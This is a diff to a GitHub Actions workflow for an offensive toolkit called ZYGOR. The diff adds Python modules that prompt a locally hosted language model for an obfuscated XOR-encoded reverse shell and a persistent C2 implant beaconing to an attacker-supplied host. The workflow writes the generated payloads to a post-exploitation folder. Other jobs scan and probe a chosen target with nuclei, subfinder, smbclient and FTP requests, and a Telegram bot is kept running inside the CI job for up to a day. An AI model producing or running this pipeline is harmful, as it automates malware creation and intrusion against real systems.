@@ -138,7 +138,7 @@ env:
   GITHUB_REF: ${{ github.ref }}
   GITHUB_ACTOR: ${{ github.actor }}
   WF_NAME: ${{ github.workflow }}
-  WORKFLOW_ID: ${{ github.workflow_id }}          # <-- use numeric ID for API
+  WORKFLOW_ID: ${{ github.workflow_id }}
 
 jobs:
   bootstrap:
@@ -270,18 +270,16 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          FINAL_MODEL="$(echo '${{ steps.pull_model.outputs.final_model }}')"
+          FINAL_MODEL="${{ steps.pull_model.outputs.final_model }}"
           [ "$FINAL_MODEL" = "none" ] && { echo "ok=false" >> $GITHUB_OUTPUT; exit 1; }
           export AI_MODEL="$FINAL_MODEL"
 
-          # Verify model loaded
           for i in $(seq 1 15); do
             curl -s http://localhost:11434/api/tags | jq -r '.models[].name // ""' | grep -q "^${FINAL_MODEL}$" && break
             sleep 3
           done
 
-          # Build ai_complete v4
-          cat > /opt/zygor/bin/ai_complete << 'AICOMPLETE_EOF'
+          cat > /opt/zygor/bin/ai_complete << 'EOF'
           #!/bin/bash
           set -euo pipefail
           PROMPT="$(cat -)"
@@ -322,11 +320,10 @@ jobs:
           done
           echo "ERROR: All $MAX_RETRIES attempts failed"
           exit 1
-          AICOMPLETE_EOF
+          EOF
           chmod +x /opt/zygor/bin/ai_complete
           sudo cp /opt/zygor/bin/ai_complete /usr/local/bin/ai_complete
 
-          # Warmup
           echo "[*] Warming up model..."
           for w in 1 2; do
             timeout 100 bash -c "export AI_MODEL='$FINAL_MODEL'; echo 'List 3 nmap scan flags for pentesting.' | /opt/zygor/bin/ai_complete 64 90 1" >/dev/null 2>&1 && echo "[✓] Warmup $w OK" && break
@@ -336,12 +333,104 @@ jobs:
           echo "[+] Test: ${TEST:0:60}"
           echo "ok=true" >> $GITHUB_OUTPUT
 
-      - name: "Build auxiliary modules (reverse, poly, c2, dashboard, notify)"
+      - name: "Build auxiliary modules"
         shell: bash
         run: |
-          # (Keep the same module builders as before – they are short heredocs)
-          # ... (copy your original steps for reverse.py, poly_payload.py, c2_agent.py, etc.)
-          # For brevity not repeated here, but they must remain.
+          cat > /opt/zygor/bin/reverse.py << 'EOF'
+          #!/usr/bin/env python3
+          import subprocess,sys,os
+          def disassemble(f): return subprocess.getoutput(f"objdump -d -M intel {f}|head -300")
+          def decompile(f): return subprocess.getoutput(f"strings {f}|head -300")
+          def patch(f,o,b):
+              with open(f,'rb') as fh: d=bytearray(fh.read())
+              for i,by in enumerate(bytes.fromhex(b)): d[o+i]=by
+              p=f+".patched"; open(p,'wb').write(d); return p
+          def pe_info(f):
+              if not os.path.exists(f): return "File not found"
+              return subprocess.getoutput(f"file {f}; exiftool {f}|head -30")
+          if __name__=='__main__':
+              if len(sys.argv)<3: sys.exit(1)
+              m,t=sys.argv[1],sys.argv[2]
+              if m=='disassemble': print(disassemble(t))
+              elif m=='decompile': print(decompile(t))
+              elif m=='peinfo': print(pe_info(t))
+              elif m=='patch':
+                  o=int(sys.argv[3],16) if len(sys.argv)>3 else 0
+                  b=sys.argv[4] if len(sys.argv)>4 else ''
+                  print(patch(t,o,b))
+          EOF
+
+          cat > /opt/zygor/bin/poly_payload.py << 'EOF'
+          #!/usr/bin/env python3
+          import subprocess,sys
+          def generate(lh,lp):
+              p=f"Write obfuscated Python reverse shell for {lh}:{lp} with XOR encoding. Only code."
+              r=subprocess.run(['/opt/zygor/bin/ai_complete','2048','120','2'],input=p.encode(),capture_output=True)
+              return r.stdout.decode().strip()
+          if __name__=='__main__':
+              lh=sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
+              lp=sys.argv[2] if len(sys.argv)>2 else '4444'
+              print(generate(lh,lp))
+          EOF
+
+          cat > /opt/zygor/bin/c2_agent.py << 'EOF'
+          #!/usr/bin/env python3
+          import subprocess,sys
+          def generate(lh,lp):
+              p=f"Write Python C2 implant beaconing to {lh}:{lp} via HTTPS with AES, persistence, watermark @zygorlap"
+              r=subprocess.run(['/opt/zygor/bin/ai_complete','4096','120','3'],input=p.encode(),capture_output=True)
+              return r.stdout.decode()
+          if __name__=='__main__':
+              lh=sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
+              lp=sys.argv[2] if len(sys.argv)>2 else '443'
+              print(generate(lh,lp))
+          EOF
+
+          cat > /opt/zygor/bin/generate_dashboard.py << 'EOF'
+          #!/usr/bin/env python3
+          import sys,json,os
+          def generate(target,findings=None):
+              f_list=""
+              if findings:
+                  for f_item in findings:
+                      f_list+=f"<li>{f_item}</li>\n"
+              return f'''<!DOCTYPE html>
+          <html><head><meta charset="UTF-8"><title>ZYGOR v4.1 Dashboard</title>
+          <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+          <style>body{{background:#0a0a0f;color:#00ff88;font-family:monospace;}}
+          .grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;padding:20px;}}
+          .card{{background:#111118;border:1px solid #00ff8833;border-radius:12px;padding:20px;}}
+          .finding{{color:#ff8844;}}</style></head>
+          <body><div class="grid">
+          <div class="card"><h2>ZYGOR v4.1</h2><p>Target: {target}</p><p>Status: ONLINE</p><p>Session: {os.environ.get('SESSION_TOKEN','N/A')}</p></div>
+          <div class="card"><h3>Findings</h3><ul>{f_list or '<li>No findings yet</li>'}</ul></div>
+          </div></body></html>'''
+          if __name__=='__main__':
+              target=sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
+              findings=sys.argv[2:] if len(sys.argv)>2 else None
+              out=sys.argv[2] if len(sys.argv)==3 else '/opt/zygor/reports/final/dashboard.html'
+              with open(out,'w') as f: f.write(generate(target,findings))
+          EOF
+
+          cat > /opt/zygor/bin/notify.py << 'EOF'
+          #!/usr/bin/env python3
+          import urllib.request,sys,json
+          def send_discord(wh,msg):
+              r=urllib.request.Request(wh,data=json.dumps({"content":msg}).encode(),headers={"Content-Type":"application/json"})
+              try: return urllib.request.urlopen(r,timeout=15).status==204
+              except: return False
+          def send_slack(wh,msg):
+              r=urllib.request.Request(wh,data=json.dumps({"text":msg}).encode(),headers={"Content-Type":"application/json"})
+              try: return urllib.request.urlopen(r,timeout=15).status==200
+              except: return False
+          if __name__=='__main__':
+              if len(sys.argv)<4: sys.exit(1)
+              mode,m,wh=sys.argv[1],sys.argv[2],sys.argv[3]
+              if mode=="discord": send_discord(wh,m)
+              elif mode=="slack": send_slack(wh,m)
+          EOF
+
+          chmod +x /opt/zygor/bin/*.py
 
       - name: "Update Nuclei templates"
         shell: bash
@@ -354,42 +443,40 @@ jobs:
           [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "$MSG" "$DISCORD_WEBHOOK" || true
           [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "$MSG" "$SLACK_WEBHOOK" || true
 
-      # =========================================================================
-      # TELEGRAM BOT – Persistent, self‑re‑trigger, blocks job until done
-      # =========================================================================
-      - name: "Start Telegram Bot v4 and wait for re‑trigger"
+      - name: "Start Telegram Bot v4 and wait for re-trigger"
         if: env.TELEGRAM_ENABLE == 'true'
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}               # <-- needed for API
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         shell: bash
         run: |
-          echo "[+] Starting bot using external script..."
+          if [ ! -f telegram_bot_v4.py ]; then
+            echo "❌ telegram_bot_v4.py not found in repository!"
+            exit 1
+          fi
+          echo "[+] Starting bot..."
           chmod +x telegram_bot_v4.py
           nohup python3 telegram_bot_v4.py > /var/log/zygor/telegram_stdout.log 2>&1 &
           BOT_PID=$!
           echo "Bot PID: $BOT_PID"
 
-          # Wait for re‑trigger flag (max 24h so we never hit the job timeout)
-          WAIT_MAX=$(( 3600 * 24 ))   # 24 hours
+          WAIT_MAX=$(( 3600 * 24 ))
           START_TS=$(date +%s)
           while true; do
             if [ -f /tmp/re_trigger_done ]; then
-              echo "✅ Re‑trigger confirmed! Flag found."
+              echo "✅ Re-trigger confirmed!"
               break
             fi
             ELAPSED=$(( $(date +%s) - START_TS ))
             if [ $ELAPSED -ge $WAIT_MAX ]; then
-              echo "❌ Timeout waiting for re‑trigger. Forcing exit."
+              echo "❌ Timeout waiting for re-trigger."
               break
             fi
             sleep 30
           done
 
-          # Clean up
           kill $BOT_PID 2>/dev/null || true
           echo "Bot stopped."
 
-      # Upload artifacts for downstream jobs
       - name: "Upload ZYGOR tools & config to artifacts"
         uses: actions/upload-artifact@v4
         with:
@@ -400,7 +487,6 @@ jobs:
             /var/log/zygor/
           retention-days: 1
 
-  # Phase jobs – unchanged, they work as before
   recon:
     needs: bootstrap
     if: ${{ github.event.inputs.penetration_phase == 'recon' || github.event.inputs.penetration_phase == 'full' }}
@@ -422,6 +508,7 @@ jobs:
             subfinder -d "$T" -silent -o /opt/zygor/reports/recon/subdomains.txt 2>/dev/null || true
           fi
           nuclei -u "http://$T" -severity critical,high -o /opt/zygor/reports/recon/nuclei.txt 2>/dev/null || true
+          echo "[✓] Recon complete"
 
   exploitation:
     needs: bootstrap
@@ -440,6 +527,7 @@ jobs:
           T="${{ env.TARGET }}"
           smbclient -L "//$T" -N 2>/dev/null | head -20 || echo "SMB unavailable"
           curl -s --connect-timeout 5 --max-time 10 "ftp://$T/" 2>/dev/null | head -5 || echo "FTP unavailable"
+          echo "[✓] Exploit complete"
 
   reverse_engineering:
     needs: bootstrap
@@ -464,6 +552,7 @@ jobs:
             mkdir -p /opt/zygor/binaries
             echo "Upload binaries to /opt/zygor/binaries/"
           fi
+          echo "[✓] RE done"
 
   web_forge:
     needs: bootstrap
@@ -480,6 +569,7 @@ jobs:
         run: |
           echo ">>> [WEB FORGE]"
           python3 /opt/zygor/bin/generate_dashboard.py "${{ env.TARGET }}" > /opt/zygor/reports/web_forge/dashboard.html 2>/dev/null || true
+          echo "[✓] Web forge done"
 
   post_exploitation:
     needs: bootstrap
@@ -497,6 +587,7 @@ jobs:
           echo ">>> [POST-EXPLOIT]"
           python3 /opt/zygor/bin/c2_agent.py "${{ env.LHOST || '127.0.0.1' }}" "${{ env.LPORT || '443' }}" > /opt/zygor/reports/post_exploitation/c2_agent.py 2>/dev/null || true
           python3 /opt/zygor/bin/poly_payload.py "${{ env.LHOST || '127.0.0.1' }}" "${{ env.LPORT || '4444' }}" > /opt/zygor/reports/post_exploitation/payload.b64 2>/dev/null || true
+          echo "[✓] Post-exploit done"
 
   reporting:
     needs: [recon, exploitation, reverse_engineering, web_forge, post_exploitation]
@@ -527,4 +618,4 @@ jobs:
               fi
             done
           } > /opt/zygor/reports/final/zygor_report.txt
-          echo "[✓] Report: /opt/zygor/reports/final/zygor_report.txt"
+          echo "[✓] Report generated"
